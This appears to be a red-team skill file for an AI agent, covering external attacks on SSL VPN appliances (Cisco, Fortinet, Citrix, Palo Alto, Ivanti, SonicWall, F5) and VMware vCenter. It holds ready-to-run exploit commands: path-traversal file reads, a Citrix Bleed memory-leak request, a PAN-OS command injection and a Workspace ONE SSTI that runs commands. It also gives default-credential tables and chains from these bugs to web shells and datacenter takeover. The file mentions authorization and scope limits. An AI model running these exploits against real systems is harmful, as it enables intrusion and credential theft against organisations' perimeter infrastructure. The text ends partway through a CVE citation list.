---
name: infrastructure-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
sources: authorized-engagement, public-advisories, cisa-kev
report_count: 1
---

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

DO NOT use for:
- Internal lateral-movement post-foothold (out of scope per user's boundary)
- VPN client-side bugs (different attack class)
- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)

---

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## CVE matrix — pre-auth or auth-bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |

```bash
# Cisco CVE-2020-3452 — file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |

```bash
# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
# If response is large (>10KB) and contains random memory contents — vulnerable
# Session tokens often present in the memory dump

# CVE-2019-19781 file read
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |

```bash
# CVE-2024-3400 detection
curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'
# Look for file-creation side-effect on test path — palo creates file with command output
```

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |

```bash
# CVE-2019-11510 — Pulse file read
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Add `-as` (auto-scan) for broader vuln coverage but slower.

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Anti-patterns

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface

---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.



---

## vmware-vcenter-attack

## When to use

Trigger when external recon shows ANY of:
- Banner: "VMware vCenter Server", "VMware vSphere Client"
- URL paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS cert SAN includes `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE Access / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
- Horizon View: `/portal`, `/admin`

Do NOT use for:
- Internal-network vCenter (out of scope — external boundary discipline)
- Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)

---

## Step 1 — Version fingerprinting

```bash
TARGET="vcenter.target.com"

# Build info endpoint (often public; revealing exact patch level)
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"

# UI build (visible in page source)
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'

# REST API version (vSphere 7+)
curl -sk "https://$TARGET/api/appliance/system/version"

# Cert metadata
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alt"

# SSO Admin Service (info disclosure)
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

Map build → version → CVE applicability via VMware advisories (vmware.com/security/advisories).

---

## Step 2 — CVE matrix (external-exploitable, sorted by historical impact)

| CVE | Affected | Vector | Status |
|---|---|---|---|
| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
| **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
| **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
| **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
| **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
| **CVE-2023-20892** | vCenter 7/8 | Use-after-free in DCE/RPC | High |
| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Pre-auth SSRF + auth bypass | Critical chained |
| **CVE-2022-22954** | Workspace ONE Access | Pre-auth server-side template injection (SSTI) → RCE | Critical, widely exploited |
| **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical |
| **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
| **CVE-2021-21972** | vCenter 6.5/6.7/7.0 < build | vRealize plugin `/ui/vropspluginui/rest/services/uploadova` pre-auth file upload → RCE | Critical, exploited heavily |
| **CVE-2020-3992** | ESXi OpenSLP | Pre-auth use-after-free → RCE | Critical, ESXi ransomware vector |
| **CVE-2019-5544** | ESXi OpenSLP | Pre-auth heap overflow | Critical |

---

## Step 3 — CVE-2021-21972 probe (still common on stale appliances)

```bash
# Detection only — DO NOT execute the file upload without explicit scope OK
curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
# 405 → endpoint exists, version vulnerable
# 404 → patched (endpoint removed)
# 401 → patched (auth required)

curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
```

Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra without explicit RCE-attempt sign-off.

---

## Step 4 — CVE-2022-22954 (Workspace ONE SSTI) probe

```bash
# Stage A — detection only: reachability + baseline. No command execution yet.
curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
# 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
# 404 → patched/removed. Keep the baseline body to diff against Stage B.

# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
# so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
# Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output
# that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
```

Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation.

---

## Step 5 — Default credentials (frequently still valid on lab/staging vCenters)

| Product | Default user | Default password |
|---|---|---|
| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
| ESXi root | `root` | `<blank>` or `vmware` |
| vCenter Server Appliance Mgmt (5480) | `root` | `<set-during-install>` |
| Aria Operations | `admin` | `vmware` (legacy) |
| Workspace ONE | `admin` | `<set>` |

⚠ **Do not spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold** (often 3 attempts → 60s lockout, configurable to permanent). One attempt with high-confidence guess only. Use creds discovered in breach corpora.

---

## Step 6 — SSO / vmdir LDAP enumeration

```bash
# SSO Admin endpoint (frequently exposes domain info)
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -

# Extract Identity Source info
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"

# Try anonymous LDAP bind to vmdir (port 389/636 if exposed)
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
```

---

## Step 7 — Managed Object Browser (MOB) — frequently leaks data

```bash
curl -skI "https://$TARGET/mob"
# 401 → auth required (good for the defender)
# 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without credentials in some misconfigs

# Auth'd MOB lets you walk the entire vSphere tree:
curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
```

---

## Step 8 — vSphere REST API enumeration (post-cred)

```bash
# Get session token
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"
# Returns: "<session-token>"

# List VMs
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"

# List hosts
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"

# List datastores
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"

# Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)
# /folder/<path>?dsName=<ds>&dcPath=<dc>
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

---

## Step 9 — Workspace ONE Access specific paths

```bash
# Metadata
curl -sk "https://$TARGET/SAAS/auth/saml/response"
curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"

# Login page
curl -sk "https://$TARGET/SAAS/login/0"
```

---

## Step 10 — Aria / vRealize specific paths

```bash
# vRealize Operations Manager
curl -sk "https://$TARGET/suite-api/api/versions"
curl -sk "https://$TARGET/casa/nodes/thumbprints"

# Aria Automation
curl -sk "https://$TARGET/csp/gateway/am/api/about"
curl -sk "https://$TARGET/cluster-administration/api/health"

# vRealize Orchestrator
curl -sk "https://$TARGET/vco/api/about"
curl -sk "https://$TARGET/vco-controlcenter/api/health"
```

---

## Tooling

- **`vCenter-Exploit` collection** (multiple PoCs on GitHub for 21972, 21985, 22005)
- **`Greenbone/openvas-scanner` VMware NASL plugins** — version detection
- **`nuclei`** templates: `vmware-vcenter-*.yaml`, `cve-2021-21972.yaml`, `cve-2022-22954.yaml`
- **`Metasploit`** modules: `exploit/multi/http/vmware_vcenter_*`

---

## Detection patterns (what defenders/SOC will see)

- Excessive 404s on `/ui/vropspluginui/*` — IDS signature
- POST to `/sdk` from non-management IP
- `administrator@vsphere.local` auth failures
- TLS handshake fingerprint changes
- Plugin upload to vRealize endpoint

Pair with `mid-engagement-ir-detection` skill — vCenter is monitored heavily in mature SOCs.

---

## External-only boundary check

If recon reveals vCenter only via VPN (not direct internet) → STOP. That is internal infrastructure and outside the external-only AI scope per `feedback_skill_boundaries`. The user handles internal vCenter work directly.

Internet-exposed vCenter is unfortunately common on the perimeter — and frequently outdated by years. The 2021-21972 / 21985 / 22954 trifecta still pays in 2026 because patching cycles for hypervisor management are slow and vendor-managed.

---

## Severity scoring guidance (red-team deliverable context)

| Finding | Severity |
|---|---|
| vCenter on internet, current patch | Informational (attack surface note) |
| vCenter on internet, missing patches with public RCE | **Critical** (entire virtualization plane compromise) |
| vCenter on internet + default admin password | **Critical** (immediate full takeover) |
| Workspace ONE on internet, unpatched 22954 | **Critical** |
| MOB anonymously accessible | **High** (full topology disclosure) |
| /sdk reachable + version disclosure only | **Medium** (info disclosure + attack-surface concentration) |

---

## Anti-patterns

- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often
- **DO NOT execute file-upload PoCs without explicit OK** — they create persistent webshells; cleanup overhead and audit trail
- **DO NOT confuse ESXi-management-on-internet with vCenter** — different attack surfaces; ESXi Open SLP CVEs target port 427
- **DO NOT skip SSL handshake banner check** — VMware exposes versions there; this is the lowest-noise initial probe

---

## Bridge to neighboring skills

- `enterprise-vpn-attack` — vCenter is frequently the post-VPN target; if VPN is breached, vCenter is the natural next pivot (but internal — defer to user)
- `m365-entra-attack` — vCenter SSO sometimes federated to Entra; cred-chain bridging
- `mid-engagement-ir-detection` — vCenter monitoring is sensitive; expect mid-engagement mitigations
- `redteam-report-template` — vCenter findings need clear blast-radius framing (this is the virtualization plane, not just an app)

---

## Related Skills & Chains

- **`hunt-saml`** — vCenter Workspace ONE / VMware Identity Manager publishes SAML SP metadata at `/SAAS/API/1.0/GET/metadata/idp.xml` and consumes assertions at predictable ACS URLs. Chain primitive: vCenter SAML SP metadata reachable → IdP fingerprinted → `hunt-saml` XSW1-XSW8 against the federating IdP → forged assertion with `userPrincipalName=administrator@vsphere.local` → SP-impersonation as vCenter admin → full virtualization-plane takeover.
- **`hunt-rce`** — VMware's high-impact CVE catalog (CVE-2021-21972, CVE-2021-21985, CVE-2022-22954, CVE-2023-20887) is almost entirely pre-auth RCE. Chain primitive: vCenter version fingerprint via SSL banner or `/ui/login` body → confirm patch level missing → `hunt-rce` deserialization/SSTI gadget from the matching CVE PoC → `root` on vCenter appliance → API-token mint → cluster-wide VM control.
- **`enterprise-vpn-attack`** — VPN compromise + vCenter on internal-only is a natural post-VPN pivot, but external-only engagement scope sometimes forbids it. Chain primitive: VPN appliance CVE → foothold inside corp network → if scope permits, `vmware-vcenter-attack` becomes reachable on internal-only vCenter → datacenter takeover.
- **`m365-entra-attack`** — Some VMware deployments federate vCenter SSO to Entra. Chain primitive: vCenter SSO discovery → AuthURL points to `login.microsoftonline.com` → `m365-entra-attack` Entra ATO on `administrator@vsphere.local` synced identity → SAML assertion → vCenter admin without ever brute-forcing vCenter SSO.
- **`mid-engagement-ir-detection`** — VMware vSAN/vCenter alerting is sensitive; expect SOC to patch or block within hours of detection. Chain primitive: confirmed vCenter CVE → run `mid-engagement-ir-detection` baseline capture BEFORE attempting exploitation → if response patterns change mid-test, capture the SOC-patched state as a SECOND finding (defensive-action observed). Package both via `redteam-report-template`.

---

## Disclosed CVEs & coordinated-disclosure citations

These are the load-bearing public references for every CVE called out in the matrix above. Every entry includes the vendor advisory, the originating researcher writeup or KEV-catalog entry, and (where public) in-the-wild exploitation references.

### 1. CVE-2021-21972 — vCenter `vropspluginui` unauthenticated arbitrary file upload (canonical pre-auth RCE)
- **Affected:** vCenter Server 6.5 < 6.5 U3n, 6.7 < 6.7 U3l, 7.0 < 7.0 U1c (vRealize Operations vCenter plugin bundled with every default install — Linux or Windows variant matters for payload). VMware Cloud Foundation 3.x/4.x also bundles.
- **Attack flow:** Unauth POST to `/ui/vropspluginui/rest/services/uploadova` with a tar/OVA containing a path-traversal entry. On Windows write `webshell.jsp` under the vsphere-ui webroot for SYSTEM; on Linux drop `authorized_keys` under `/home/vsphere-ui/.ssh/` and SSH in.
- **Root cause:** Endpoint exposed by the vRealize Operations plugin lacked any authentication filter; the `uploadova` handler did not sanitize archive entry paths.
- **Disclosure:** Reported by Mikhail Klyuchnikov (Positive Technologies / PT SWARM) in autumn 2020; advisory + patch published 2021-02-23 as VMSA-2021-0002; PoC on GitHub the next day triggered mass scanning. **CISA KEV:** added 2021-11-03. Year discovered 2020, patched 2021.
- **References:** https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23599 ; https://swarm.ptsecurity.com/unauth-rce-vmware/ ; https://www.tenable.com/blog/cve-2021-21972-vmware-vcenter-server-remote-code-execution-vulnerability ; https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972

### 2. CVE-2021-21985 — vCenter vSAN Health Check plug-in pre-auth RCE
